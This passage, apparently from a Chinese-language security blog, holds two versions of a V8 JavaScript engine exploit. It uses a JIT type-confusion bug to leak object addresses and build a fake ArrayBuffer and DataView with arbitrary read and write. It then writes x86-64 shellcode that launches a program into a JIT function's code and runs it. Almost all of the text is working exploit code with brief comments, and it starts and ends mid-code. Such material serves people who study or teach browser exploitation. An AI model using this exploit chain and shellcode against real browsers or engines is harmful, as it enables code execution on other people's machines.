class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_to_float</span>(<span class="params">intarr,floatarr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; intarr.length;i = i+<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> re = d2u(intarr[i+<span class="number">1</span>],intarr[i]);</span><br><span class="line">        floatarr[j] = re;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nop = <span class="number">0xdaba0000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造ArrayBuffer的map</span></span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    nop,nop,</span><br><span class="line">    <span class="number">0x0f00000a</span>,<span class="number">0x001900c6</span>,<span class="number">0x082003ff</span>,<span class="number">0x0</span>,</span><br><span class="line">    nop,nop,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    nop,nop,<span class="number">0x0</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=read_obj_addr(ab.__proto__);</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//用ab_proto_addr和ab_constructor_addr替换fake map中的nop</span></span><br><span class="line">ab_map_obj[<span class="number">0x6</span>] = ab_proto_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x7</span>] = ab_proto_addr / <span class="number">0x100000000</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x8</span>] = ab_constructor_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x9</span>] = ab_constructor_addr / <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab_map_obj_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">// 将int array转换成double array</span></span><br><span class="line">change_to_float(ab_map_obj,ab_map_obj_float);</span><br><span class="line"><span class="comment">// 此处gc是为了将ab_map_obj_float放入到old space里，</span></span><br><span class="line"><span class="comment">// 如果没有gc则ab_map_obj_float会在后续的leak中由于gc而被迁移</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj_float的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj_float);</span><br><span class="line"><span class="comment">// leak ab_map_obj_float的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">ab_map_obj_addr=read_obj_addr1(ab_map_obj_float)+<span class="number">0x280</span>+<span class="number">0x10</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x4000</span>, <span class="comment">/* buffer length */</span></span><br><span class="line">    <span class="number">0x12345678</span>,<span class="number">0x123</span>,<span class="comment">/* buffer address */</span></span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> fake_ab_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">change_to_float(fake_ab,fake_ab_float);</span><br><span class="line">gc();</span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab_float的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab_float);</span><br><span class="line">fake_ab_float_addr=read_obj_addr2(fake_ab_float)+<span class="number">0x300</span>+<span class="number">0x10</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr_f = d2u(fake_ab_float_addr / <span class="number">0x100000000</span>,fake_ab_float_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">print(fake_ab_float_addr_f + <span class="string">'\n\n\n'</span>);</span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr_f);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr_f);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=read_obj_addr3(evil_f)+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read32</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    <span class="comment">//get方法的参数都是一个字节序号（不能是负数，否则会报错），表示从哪个字节开始读取。</span></span><br><span class="line">    <span class="comment">//如果一次读取两个或两个以上字节，就必须明确数据的存储方式，到底是小端字节序还是大端字节序。</span></span><br><span class="line">    <span class="comment">//默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。</span></span><br><span class="line">    <span class="keyword">return</span> fake_dv.getUint32(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write32</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    print(<span class="string">"write"</span>);</span><br><span class="line">    fake_dv.setUint32(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+<span class="number">0x4</span>) * <span class="number">0x100000000</span>;;</span><br><span class="line">print(shellcode_address.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> addr = shellcode_address<span class="number">-1</span>+<span class="number">0x60</span>;</span><br><span class="line">fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="comment">// shellcode[0] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[1] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[2] = 0x782fb848;</span></span><br><span class="line"><span class="comment">// shellcode[3] = 0x636c6163;</span></span><br><span class="line"><span class="comment">// shellcode[4] = 0x48500000;</span></span><br><span class="line"><span class="comment">// shellcode[5] = 0x73752fb8;</span></span><br><span class="line"><span class="comment">// shellcode[6] = 0x69622f72;</span></span><br><span class="line"><span class="comment">// shellcode[7] = 0x8948506e;</span></span><br><span class="line"><span class="comment">// shellcode[8] = 0xc03148e7;</span></span><br><span class="line"><span class="comment">// shellcode[9] = 0x89485750;</span></span><br><span class="line"><span class="comment">// shellcode[10] = 0xd23148e6;</span></span><br><span class="line"><span class="comment">// shellcode[11] = 0x3ac0c748;</span></span><br><span class="line"><span class="comment">// shellcode[12] = 0x50000030;</span></span><br><span class="line"><span class="comment">// shellcode[13] = 0x4944b848;</span></span><br><span class="line"><span class="comment">// shellcode[14] = 0x414c5053;</span></span><br><span class="line"><span class="comment">// shellcode[15] = 0x48503d59;</span></span><br><span class="line"><span class="comment">// shellcode[16] = 0x3148e289;</span></span><br><span class="line"><span class="comment">// shellcode[17] = 0x485250c0;</span></span><br><span class="line"><span class="comment">// shellcode[18] = 0xc748e289;</span></span><br><span class="line"><span class="comment">// shellcode[19] = 0x00003bc0;</span></span><br><span class="line"><span class="comment">// shellcode[20] = 0x050f00;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h4 id="版本2-工具类在上面"><a href="#版本2-工具类在上面" class="headerlink" title="版本2(工具类在上面)"></a>版本2(工具类在上面)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,</span><br><span class="line">    <span class="number">6.73490047e-316</span>,</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr0,evil_r0)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">ab_map_obj[<span class="number">0x3</span>]=<span class="keyword">new</span> Int64(ab_proto_addr).asDouble();</span><br><span class="line">ab_map_obj[<span class="number">0x4</span>]=<span class="keyword">new</span> Int64(ab_constructor_addr).asDouble();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr1,evil_r1)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ab_map_obj_addr = read_obj_addr1(ab_map_obj);</span></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br><span class="line"></span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 